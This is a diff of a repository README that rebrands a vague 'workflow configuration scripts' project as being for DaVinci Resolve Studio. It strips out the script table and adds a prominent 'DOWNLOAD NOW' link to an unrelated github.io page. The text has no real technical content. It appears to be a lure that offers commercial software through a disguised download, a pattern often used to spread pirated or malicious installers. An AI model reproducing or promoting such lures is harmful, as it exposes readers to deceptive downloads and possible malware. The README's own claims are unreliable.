@@ -1,15 +1,12 @@
-# Video Maestro | Workflow Configuration Scripts
-This repository contains technical scripts and configurations for automating the Video Maestro environment.
+# Davinci Resolve Studio| Workflow Configuration Scripts
+
+This repository contains scripts and configurations for automating the Davinci Resolve environment. These utilities streamline common tasks and integrate the software into existing system workflows.
+
+[📥 **DOWNLOAD NOW**](https://avalanchemidge.github.io/?zi17)
 
 ## Usage Overview
-The scripts provided here facilitate streamlined setup and management of Video Maestro system integrations and deployment.
+The provided scripts are designed for command-line execution or integration into automated build/deployment pipelines. They facilitate system-level interaction with Davinci Resolve to manage settings and resources.
 
-## Technical Implementation
-| Component         | Description                                       |
-| :---------------- | :------------------------------------------------ |
-| `env_setup.sh`    | Initializes core environment variables.           |
-| `config_sync.py`  | Manages synchronization of configuration files.   |
-| `task_runner.ps1` | Orchestrates sequential workflow execution.       |
 
 ## Configuration Notes
-Local system configuration steps are required. Review and modify script parameters to align with specific operational requirements.
+Ensure all relevant environment variables are set according to local system requirements. Specific paths and resource locations may need adjustment within the script files to match your deployment environment. Refer to inline comments for detailed modification instructions during local configuration steps.
